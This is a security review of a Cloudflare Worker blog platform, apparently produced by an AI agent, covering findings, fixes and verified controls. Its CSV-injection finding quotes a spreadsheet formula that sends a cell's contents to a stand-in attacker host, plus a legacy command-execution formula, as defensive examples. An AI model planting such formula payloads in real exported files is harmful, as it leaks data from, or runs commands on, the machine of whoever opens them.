# Security review — DYPOL Blog

**Target:** `blog.dypol.workers.dev` (Cloudflare Worker, TanStack Start, D1 + R2)
**Repository:** `rstmcsoch/dypol-blog` @ `4e0afa1`
**Review date:** 12 November 2026
**Reviewer:** Arena agent, independent review (this document was produced from scratch; the pre-existing `AUDIT-REPORT.md` and `docs/` were not used as input)

---

## 1. Executive summary

The application is a hardened, single-owner editorial platform. Most of the classes that usually break a blog of this shape — CSRF on server functions, OAuth code interception, SSRF in image intake, path traversal in object keys, stored XSS through article content — are already prevented, and in several places deliberately and well.

Six defects were identified and fixed in this review; none is remotely exploitable without the owner's participation or a compromised admin session. The two that matter most in practice are **CSV formula injection in the analytics exports** (the owner opens those files in Excel/Sheets, and the cell contents are machine-written) and a **public write endpoint that bypassed the read-only deployment guard and had no throttle**.

| Severity | Count | Fixed |
| --- | --- | --- |
| High | 0 | — |
| Medium | 2 | 2 |
| Low | 4 | 4 |
| Informational | 2 | reported only (design decisions / dead code) |

Verification after the fixes: `tsc --noEmit` clean, `eslint` clean on all touched files, **425/425** unit tests pass, production build succeeds.

---

## 2. What was reviewed

### 2.1 Attack-surface inventory

| Trust boundary   | Entry points | Notes |
| --- | --- | --- |
| Anonymous reader | `/`, `/articles/*`, `/topics/*`, `/special/*`, `/search`, `/$page`, `/about` | Server functions in `src/content/public-api.ts` → `repository.server.ts` |
| Anonymous writer (telemetry) | `POST /api/views/:slug`, `/api/not-found`, `/api/analytics/beacon`, `/api/ad-events`, `/api/contact` | All unauthenticated by design; must never cost more than they are worth |
| Cross-site attacker | Every cookie-authenticated server function under `/admin` | Session cookie `dypol_desk`, `SameSite=Lax` |
| MCP / AI client | `POST /mcp`, `/oauth/{authorize,token,register}`, `.well-known/oauth-*` | Bearer token, profile tokens (`dyp_…`), or OAuth 2.1 + PKCE |
| Admin session holder | ~70 server functions in `admin-api.ts`, `ads-api.ts`, `storage-api.ts` | `guard()` = read, `writeGuard()` = write (adds same-origin + writable check) |
| Object store | `/media/:id`, `/ad-media/:name`, `/special-charts/:slug/:chartId`, `/photolab`, `/webpushr-sw.js` | D1 metadata + R2 bytes |
| Machine-readable | `/robots.txt`, `/sitemap.xml`, `/news-sitemap.xml`, `/feed.xml`, `/ads.txt`, `/manifest.webmanifest` | Host-derived absolute URLs |

### 2.2 Method

1. **Manual review of every server-side entry point** — route handlers, server functions, OAuth/token endpoints, cron-less sweeps, storage helpers.
2. **Sink-driven review of the browser** — every `dangerouslySetInnerHTML`, every `href`/`src` that can come from stored data, plus the CSV and XML emitters.
3. **Threat modelling per boundary** — what an anonymous visitor, a cross-site page, an AI/MCP client, and a stolen session can each reach.
4. **Claims checked, not assumed** — e.g. JSON-LD in a `<script>` tag was exercised against the real React SSR renderer rather than reasoned about (see §5.5).
5. **Gates after every change** — `tsc --noEmit`, `eslint`, `npm run test:src` (425 tests), `npm run build`.
6. **Live spot checks** — `GET /`, `/robots.txt`, `/.well-known/oauth-authorization-server`.

### 2.3 Limitations (stated so the report is not over-read)

- The sandbox has no raw outbound HTTP to the deployment (only GitHub/npm/PyPI), so **response headers could not be captured live**. Header work is verified by code path and build, not by `curl -I` against production.
- No production secrets were used, so **no authenticated admin or MCP flow was exercised end to end**. Authentication findings are from code review plus the existing test suite, not from a live login.
- No load or fuzzing was performed. This is a code-level review, not a penetration test.

---

## 3. Findings

### SEC-01 — CSV formula injection in analytics exports (Medium) — **fixed**

**Where:** `src/content/analytics.server.ts` → `csvEscape()` (now `src/lib/analytics-csv.ts`)
**CWE-1236** (improper neutralisation of special elements used in a CSV formula)

The export endpoints (`/api/analytics/export`) write article titles, slugs, topic/tag labels and growth labels into CSV. The only escaping was RFC 4180 quoting. Excel, LibreOffice and Google Sheets evaluate a cell whose **first character** is `=`, `+`, `-`, `@`, TAB or CR **even when the cell is quoted**, so a title such as

```
=HYPERLINK("https://attacker.example/?d="&A1,"Open")
```

is a formula that exfiltrates the adjacent cell (or, in older Excel, `=cmd|'/c calc'!A1` executes a command) the moment the owner opens `dypol-articles-*.csv`.

Why this is reachable without the owner typing anything hostile: article titles are produced by the automation pipeline from external news sources and stored through MCP. The owner's only action is the routine "Export CSV" → "Open in Excel".

**Fix:** every cell is now prefixed with an apostrophe when it starts with a formula lead-in, before quoting, so the spreadsheet treats it as literal text. Logic moved to a pure module so it is unit-testable without the database.

**Verification:** `src/lib/analytics-csv.test.ts` (5 tests) covers quoting, embedded quotes/newlines, and seven formula payloads including `=HYPERLINK`, `=cmd|…` and the TAB/CR variants. Registered in `npm run test:src`.

---

### SEC-02 — Ad-impression beacon bypassed the read-only guard and had no throttle (Medium) — **fixed**

**Where:** `src/routes/api/ad-events.ts`
**CWE-770** (allocation of resources without limits), **CWE-863** (incorrect authorization)

`POST /api/ad-events` writes rows to D1 via `recordAdEvents()`. Unlike its siblings (`/api/views`, `/api/not-found`, which both call `writesAllowed()` and check fetch metadata) it:

- did **not** call `writesAllowed()`, so a version-preview host (`<sha>-blog.….workers.dev`) — which shares the **production** D1/R2 bindings by design — could write production ad statistics;
- accepted **headerless** clients (no `Origin`, no `Sec-Fetch-Site`), so a script or bot could post freely;
- had **no rate limit**, while each accepted request costs a settings read and up to 30 upserts.

Impact is integrity/availability of ad reporting rather than data disclosure — sponsor impression and click counts (which the owner may bill against) can be inflated, and the endpoint is a cheap write amplifier.

**Fix:** same-origin check → fetch-metadata gate → bot UA filter → per-IP rate limit (`MCP_LIMITER`, key `adevents:<ip>`) → `writesAllowed()` → parse. Any failure of the limiter/binding now skips the write instead of proceeding. Identifier filtering still happens in `recordAdEvents()`, which keeps only ids present in the current ad settings and caps the batch at 30.

---

### SEC-03 — Unbounded analytics growth, attacker-controlled session ids (Low–Medium) — **fixed**

**Where:** `src/routes/api/analytics/beacon.ts`
**CWE-770**

`analytics_sessions.session_id` and `analytics_article_session.session_id` are supplied by the browser (a 30-day cookie) and were validated only as "8–64 characters of anything". The rows are never deleted, and the longest dashboard window is 12 months. Consequences:

- An unauthenticated client can mint **unlimited distinct primary keys** (nothing overwrites an old row), at up to 30 beacons/min/IP, growing D1 indefinitely.
- Arbitrary characters (including control/newline bytes) could enter a column that is later rendered in the admin Stats pages and CSV exports.

**Fix:** the session id is now constrained to the shape the client actually produces (`^[A-Za-z0-9_-]{8,64}$`, matching `crypto.randomUUID()` and its fallback), and a bounded retention sweep deletes rows older than **400 days** — outside every reporting window, so no dashboard number changes. The sweep runs at most once per hour per isolate, is best-effort, and can never fail a beacon.

---

### SEC-04 — Internal error text rendered to anonymous visitors (Low) — **fixed**

**Where:** `src/lib/error-component.tsx`
**CWE-209** (generation of error message containing sensitive information)

The router error boundary printed `error.message` verbatim on every route. On a public page that string can be a D1 statement error (table/column names, SQL fragments), the media-store binding error (bucket name, database name **and id**), or a WebCrypto/JSON message quoting payload fragments. That is free reconnaissance for an attacker mapping the backend, and it looks like a defect to readers.

**Fix:** the raw message is now shown only on `/admin` and `/preview/*` (the owner's own troubleshooting context). Public pages get the localised generic sentence. The path is read from `window` rather than a router hook so the boundary also works for errors thrown outside a route match; during SSR there is no `window`, which falls back to the generic message — the safe direction.

**Not changed:** nothing is hidden from the operator — server-side `console.error` calls remain, and the desk still shows full detail.

---

### SEC-05 — Baseline security headers applied to HTML only; no CSP anywhere (Low) — **fixed**

**Where:** `src/start.ts` (request middleware), `/photolab` early return
**CWE-693** (protection mechanism failure)

The middleware set HSTS, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` and `X-Frame-Options` **only when `content-type` contained `text/html`** — so JSON, XML, image, font and redirect responses had none of them. The `/photolab` branch returns before that block entirely. And the site sent **no Content-Security-Policy at all**; the comment explained that a full policy risks the inline theme bootstrap, ads and consent tooling (reasonable), but that left even the safe, source-less directives unset.

**Fix, in two parts:**

1. Baseline headers moved out of the HTML branch and applied to **every** response, guarded by `has()` so any route that already sets a stricter value wins, and wrapped in `try/catch` because some platform-built `Response` objects expose immutable headers. `X-Frame-Options: SAMEORIGIN` stays HTML-only (it is meaningless on JSON).
2. A **safe subset** of CSP is added where a route does not set its own:
   `object-src 'none'; base-uri 'self'`
   It declares no script/style/image/connect source, so inline bootstrap, the ads runtime, GA, owner head code and social embeds are untouched — but it closes `<base>` hijacking (which would silently retarget every relative URL on the page) and plugin-document embedding. Routes with their own stricter policy (OAuth consent, `/media`, `/special-charts/*.svg`) keep theirs.
3. `nosniff` added to the `/photolab` responses, which return before the middleware's header block.

**Why not a full CSP:** a meaningful `script-src` would require nonce/hash plumbing through every inline block and, more importantly, the owner's `Admin → Settings → Custom head code` and `Admin → Ads` snippets are arbitrary third-party inline scripts. Forcing a policy now would either break the owner's tooling or require `'unsafe-inline'`, which buys almost nothing. This is left as a documented recommendation (§5.2) rather than a half-measure.

---

### SEC-06 — Null request dereference in the contact-form config (Low) — **fixed**

**Where:** `src/content/public-api.ts` → `getContactConfig`
**CWE-476**

`new URL(getRequest().url)` throws when there is no request context (build-time evaluation, or any future caller outside a request), turning a configuration read into a 500. A missing host makes `turnstileConfig()` return no keys, and the form fails closed — which is the intended behaviour anyway.

**Fix:** null-guarded; absence of a request now yields "not configured" instead of an exception.

---

### SEC-07 — Shared preview OAuth client secret committed to the repository (Informational)

**Where:** `src/lib/auth/preview.ts` → `PREVIEW_CLIENT_SECRET`

A literal client secret is in source control. Context matters and is documented in the file: it is the **shared, low-privilege live-preview client** of the platform auth broker, restricted to `*.grok-sandbox.com` callbacks, not this app's own credential.

Reachability check performed: there is **no `/api/auth/*` route** in `src/routes`, so the Better Auth server module is never mounted, and the value never leaves the server bundle. It is dead code on this deployment.

**Recommendation:** either delete the unused Better Auth scaffolding, or read this value from the environment. Do **not** rotate it unilaterally — the same value lives in the broker's configuration and rotating one side breaks live-preview sign-in platform-wide.

---

### SEC-08 — Accepted residual risks (Informational)

These are deliberate trade-offs that I reviewed and agree with, recorded so they are not re-litigated as "missed findings":

| Item | Assessment |
| --- | --- |
| Session cookie is `dypol_desk`, not `__Host-` prefixed | `HttpOnly; Secure; SameSite=Lax; Path=/` is set and the HMAC is bound to both secrets. The `__Host-` prefix would add real value (blocks a sibling/subdomain from overwriting it) but renames the cookie and signs the owner out once. Worth doing at the next forced re-login. |
| `SameSite=Lax` rather than `Strict` | `Strict` breaks the first navigation back from external links (including the OAuth callback), showing a signed-out page. Lax + `Origin`/`Sec-Fetch-Site` checks on every write + the cross-site isolation guard is the right combination. |
| `X-Frame-Options: SAMEORIGIN` | The desk previews its own pages in same-origin iframes. `DENY` would break the builder preview. |
| Owner-supplied inline `<script>` in head code / ad creatives | The owner is the trust root; these are the product. They are the reason a full CSP is not attempted. |
| `sameOriginRequest()` allows a request with no `Origin` header | Browsers always send `Origin` on cross-site writes and `SameSite=Lax` withholds the cookie on cross-site POST, so this is defence-in-depth rather than a hole. Non-browser clients are the intended audience for cookie-less calls. |
| `ADMIN_TOKEN` bootstrap remains available until password+TOTP setup is confirmed | Documented fail-safe direction (D1 impairment must not brick the desk). Confirmed by code: `signInDesk()` refuses the token once a confirmed TOTP user exists. |

---

## 4. Controls verified as sound

Recorded with the evidence used, so a future reviewer can re-check rather than re-discover.

**Authentication & sessions** — HMAC-SHA256 session tokens over `v1.iat.exp.nonce` keyed by `ADMIN_TOKEN` + `ADMIN_SESSION_SECRET`; 12-hour server-enforced expiry with a 60 s skew window; `constantTimeEqual` comparisons; server-side revocation list keyed by hashed nonce (logout invalidates a copied cookie immediately); 5 attempts/60 s per IP via the native rate-limit binding, failing **closed** if the binding is missing; wrong-token and success paths both consume the limiter so validity is not leaked.

**Credential storage** — PBKDF2-HMAC-SHA256, 100 000 iterations (Workers' ceiling, pinned by a test), 128-bit salt, 256-bit output, `pbkdf2-sha256$<iter>$<salt>$<hash>` with the iteration count read back from the record; unknown usernames verified against a real dummy hash (timing equalisation); TOTP with a ±2-step window behind the sign-in limiter; recovery codes stored only as SHA-256 hashes and consumed by an atomic `update … returning` (single use); TOTP secret AES-GCM-256 encrypted under a key derived from the session key material. Sensitive changes (password, TOTP reset, recovery regeneration) all re-require current password **and** current second factor.

**Authorization coverage** — every one of the ~70 admin server functions resolves through `guard()` or `writeGuard()`; a script that parses each handler confirmed there is no unguarded export. `writeGuard()` adds same-origin enforcement and the writable-deployment check. The `/admin` route's `beforeLoad` redirect is convenience only — each server function re-verifies the cookie, so a bypassed client guard yields no data.

**CSRF / cross-tenant** — `assertSameSiteRequest()` at the auth-middleware chokepoint rejects scripted cross-site and same-site-sibling requests (allowing only same-origin, non-browser, and top-level GET navigations). Logout, login and every write also assert same-origin. The OAuth consent POST additionally rejects `Sec-Fetch-Site: cross-site` and mismatched `Origin`.

**OAuth / MCP** — authorization code + S256 PKCE only; codes, access and refresh tokens are HMACs with the kind and expiry inside the MAC; single-use enforced by an atomic D1 nonce claim; redirect URIs restricted to an allow-list of MCP client hosts (or owner-listed hosts) with loopback treated port-agnostically; signed client ids let dynamic registration stay stateless; `client_id` in the body must match the `Basic` header; confidential clients verified with a hash comparison and version binding. Browser `Origin` must be allow-listed before the MCP transport is touched; request bodies are read through a hard 15 MB cap; GET/DELETE are 405 (stateless, no SSE).

**Injection** — all D1 access uses parameterised tagged templates or `query(text, params)`; the only interpolated SQL fragment is a constant snippet delimiter. FTS input is tokenised (`[^\\p{L}\\p{N}]+` split, 8 terms, quoted prefix) and passed as `$1`. Article/special content is plain text with inline markdown rendered to a typed AST — raw HTML is never emitted and `safeHref` accepts only `http(s)`, `mailto:`, `www.` and single-slash relative paths. `sanitizeSpecialContent` strips tags, control/bidi characters and `javascript:`/`vbscript:`/`data:` before storage; `safeUrl` allows only https or site-relative. XML/RSS/sitemap output escapes `& < > " '`. The `</script>` question for JSON-LD was settled empirically: React escapes it (`<\/script>` style), so there is no break-out.

**SSRF** — the automation image fetcher enforces https-only, port 443, no credentials in URL, no IP literals or bracket-literal hosts, no single-label/`*.local|internal|lan|corp` names, manual redirects (max 3, re-validated each hop), 10 s timeout, a 10 MB streaming cap, and magic-number validation of the returned bytes regardless of `Content-Type`.

**Uploads & media** — MIME restricted to jpeg/png/webp/gif and verified from magic bytes; 10 MB cap; 50 MP / 12 000 px limits after header parsing; R2 keys built from a UUID-validated id (`mediaObjectKey` rejects anything else); `/media/:id` sends an explicit `content-type`, `nosniff`, ETag and variant-aware cache policy; ad banner filenames are regex-constrained and served with `nosniff`.

**Path traversal** — special-article ids pass `assertId` (`^[A-Za-z0-9_-]{1,80}$`) before becoming R2 keys; `/photolab` rejects `..` and `/`; `/special-charts` validates both slug and chart id; media ids are UUIDs.

**Secrets & leakage** — no AWS/GitHub/OpenAI/Google-style key or private key found in the working tree or in git history; API keys are read from Worker bindings and only their *names* are ever surfaced in the UI; tokens are never written to logs (`console.error` calls log messages and status, not secrets).

**Redirects** — `/ad-click/:id` resolves the target from stored settings through `safeHttpUrl` (http/https only) and returns 302 with `no-store`; sponsor targets are re-derived server-side, never taken from the query string; the legacy-host redirect is a fixed canonical origin, not a reflected one; absolute URLs in metadata/feeds derive from `canonicalOriginFrom()`, which pins any `*.workers.dev` host to the canonical origin (no Host-header cache poisoning).

---

## 5. Recommendations (not implemented here)

1. **Automation blast radius.** The MCP surface can create and publish content. Publishing is gated by the owner's policy, per-run and daily caps, and `writesAllowed()` — good. Consider also alerting the owner (existing Messages channel) on any publish performed through a profile token, so an unnoticed token leak is detectable in hours rather than at the next audit.
2. **Full CSP later.** If the owner's third-party inline snippets are ever consolidated into a fixed set of hosts, a real `script-src` with hashes becomes practical. That is a product decision, not a bug.
3. **`__Host-` cookie prefix** at the next forced sign-out, together with `__Host-dypol_2fa`.
4. **Secret rotation hygiene.** `ADMIN_TOKEN`, `ADMIN_SESSION_SECRET`, `MCP_TOKEN`, `CLOUDFLARE_API_TOKEN`, `CLOUD_TOKEN_KEY` and the AI provider keys should be rotated on any suspected exposure; rotating the first two also invalidates every desk session and the stored TOTP secret (recovery codes still work), which is documented behaviour worth re-reading before doing it.
5. **Delete the unused auth scaffolding** (`src/lib/auth/server.ts` and friends) or move `PREVIEW_CLIENT_SECRET` to the environment, so no secret literal ships in a public repository.
6. **Monitoring.** The observability flag is on; a dashboard on 4xx/5xx rates per path would surface beacon abuse and probing early. `/admin/health` already aggregates site health.

---

## 6. Change log for this review

| File | Change |
| --- | --- |
| `src/lib/analytics-csv.ts` | **new** — RFC 4180 quoting + formula neutralisation |
| `src/lib/analytics-csv.test.ts` | **new** — 5 tests, registered in `test:src` |
| `src/content/analytics.server.ts` | uses the shared `csvEscape` |
| `src/routes/api/ad-events.ts` | origin + fetch-metadata gate, rate limit, `writesAllowed()` |
| `src/routes/api/analytics/beacon.ts` | session-id pattern, 400-day retention sweep |
| `src/lib/error-component.tsx` | detail shown only on desk/preview paths |
| `src/start.ts` | baseline headers on all responses, safe CSP subset, `nosniff` on `/photolab` |
| `src/content/public-api.ts` | null-safe `getContactConfig` |
| `package.json` | new test file added to `test:src` |

**Verification:** `npx tsc --noEmit` → 0 errors; `npx eslint` on all touched files → 0 problems; `npm run test:src` → 425 pass / 0 fail; `npm run build` → success.
